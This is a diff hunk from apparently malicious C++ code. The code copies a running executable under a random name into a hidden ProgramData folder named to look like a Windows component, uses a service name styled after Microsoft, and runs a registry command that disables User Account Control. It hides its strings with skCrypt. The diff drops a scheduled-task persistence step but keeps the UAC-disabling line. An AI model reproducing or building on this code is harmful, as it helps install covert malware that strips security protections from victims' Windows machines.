@@ -76,20 +76,16 @@ string apiCall(char* input) {
 
 void notLinked(char* path) {
     string rndPath, rndName, svcName, absPath, command;
-    rndPath = cmd(skCrypt("echo %userprofile%\\%random%\\%random%"));
+    rndPath = cmd(skCrypt("echo %programdata%\\WindowsHolographicDevices\\"));
     svcName = cmd(skCrypt("echo Micro%random%roSoft"));
     rndName = cmd(skCrypt("echo %random%.exe"));
-    absPath = rndPath + "\\" + rndName;
+    absPath = rndPath + rndName;
     command = "mkdir " + rndPath;
     cmd(to_char(command));
     command = skCrypt("copy ");
     command += path;
     command += " " + absPath;
-    command += skCrypt(" && schtasks /create /f /tn ");
-    command += svcName;
-    command += skCrypt(" /tr \"");
-    command += absPath;
-    command += skCrypt("\" /sc onlogon && reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
+    command += skCrypt(" && reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
     cmd(to_char(command));
     string code = apiCall(skCrypt("new"));
     system(skCrypt("cls"));
